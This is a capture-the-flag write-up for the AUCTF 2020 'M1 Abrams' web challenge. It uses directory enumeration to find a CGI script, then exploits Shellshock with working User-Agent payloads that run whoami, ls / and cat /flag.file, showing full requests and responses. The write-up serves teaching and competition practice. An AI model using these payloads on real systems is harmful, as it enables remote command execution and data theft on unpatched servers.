# AUCTF 2020 – M1 Abrams

* **Category:** web
* **Points:** 977

## Challenge

> http://challenges.auctf.com:30024
> 
> We built up this server, and our security team seems pretty mad about it. See if you can find out why.
> 
> Author: shinigami

## Solution

Connecting to the URL you will find a default Apache2 installation page. The version of the server is `Apache/2.4.29 (Ubuntu)`.

Performing an enumeration will let you to discover the following.

```
user@machine:~$ sudo dirb http://challenges.auctf.com:30024/ /usr/share/dirb/wordlists/vulns/apache.txt -x /usr/share/dirb/wordlists/extensions_common.txt -w

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Apr  5 11:32:26 2020
URL_BASE: http://challenges.auctf.com:30024/
WORDLIST_FILES: /usr/share/dirb/wordlists/vulns/apache.txt
OPTION: Not Stopping on warning messages
EXTENSIONS_FILE: /usr/share/dirb/wordlists/extensions_common.txt | ()(.asp)(.aspx)(.bat)(.c)(.cfm)(.cgi)(.com)(.dll)(.exe)(.htm)(.html)(.inc)(.jhtml)(.jsa)(.jsp)(.log)(.mdb)(.nsf)(.php)(.phtml)(.pl)(.reg)(.sh)(.shtml)(.sql)(.txt)(.xml)(/) [NUM = 29]

-----------------

GENERATED WORDS: 30

---- Scanning URL: http://challenges.auctf.com:30024/ ----
+ http://challenges.auctf.com:30024/cgi-bin/ (CODE:403|SIZE:288)
+ http://challenges.auctf.com:30024/icons/ (CODE:403|SIZE:288)
+ http://challenges.auctf.com:30024/index.html (CODE:200|SIZE:10918)
+ http://challenges.auctf.com:30024/server-status (CODE:403|SIZE:288)
+ http://challenges.auctf.com:30024/server-status/ (CODE:403|SIZE:288)

-----------------
END_TIME: Sun Apr  5 11:33:49 2020
DOWNLOADED: 870 - FOUND: 5
```

Analyzing `cgi-bin/` directory will let you to discover an interesting endpoint.

```
user@machine:~$ sudo dirb http://challenges.auctf.com:30024/cgi-bin/ -w

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Apr  5 12:04:05 2020
URL_BASE: http://challenges.auctf.com:30024/cgi-bin/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://challenges.auctf.com:30024/cgi-bin/ ----
+ http://challenges.auctf.com:30024/cgi-bin/scriptlet (CODE:200|SIZE:55)

-----------------
END_TIME: Sun Apr  5 12:10:22 2020
DOWNLOADED: 4612 - FOUND: 1
```

Connecting to `http://challenges.auctf.com:30024/cgi-bin/scriptlet` will give you the following.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The scriptlet is vulnerable to [*Shellshock*](https://en.wikipedia.org/wiki/Shellshock_(software_bug)).

```
GET /cgi-bin/scriptlet HTTP/1.1
Host: challenges.auctf.com:30024
User-Agent: () { :;};echo -e "\r\n$(/usr/bin/whoami)"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.1 200 OK
Date: Sun, 05 Apr 2020 12:16:07 GMT
Server: Apache/2.4.29 (Ubuntu)
Connection: close
Content-Length: 89

www-data
Content-type: text/html


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So you can use it to enumerate the root directory to find `flag.file`.

```
GET /cgi-bin/scriptlet HTTP/1.1
Host: challenges.auctf.com:30024
User-Agent: () { :;};echo -e "\r\n$(/bin/ls /)"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.1 200 OK
Date: Sun, 05 Apr 2020 12:19:24 GMT
Server: Apache/2.4.29 (Ubuntu)
Connection: close
Content-Length: 175

bin
boot
dev
etc
flag.file
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
Content-type: text/html


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And then print it.

```
GET /cgi-bin/scriptlet HTTP/1.1
Host: challenges.auctf.com:30024
User-Agent: () { :;};echo -e "\r\n$(/bin/cat /flag.file)"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.1 200 OK
Date: Sun, 05 Apr 2020 12:20:01 GMT
Server: Apache/2.4.29 (Ubuntu)
Connection: close
Content-Length: 194

1f8b0808de36755e0003666c61672e747874004b2c4d2e49ab56c9303634
8c0fce30f08ecf358eaf72484989ace502005a5da5461b000000
Content-type: text/html


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The content of the file is the hexadecimal representation of a GZip archive (i.e. signature `1f8b08`).

This [file](flag.gz) can be re-created with an hexadecimal editor. If you open the archive you will find the `flag.txt` file with the flag.

```
auctf{$h311_Sh0K_m3_z@ddY}
```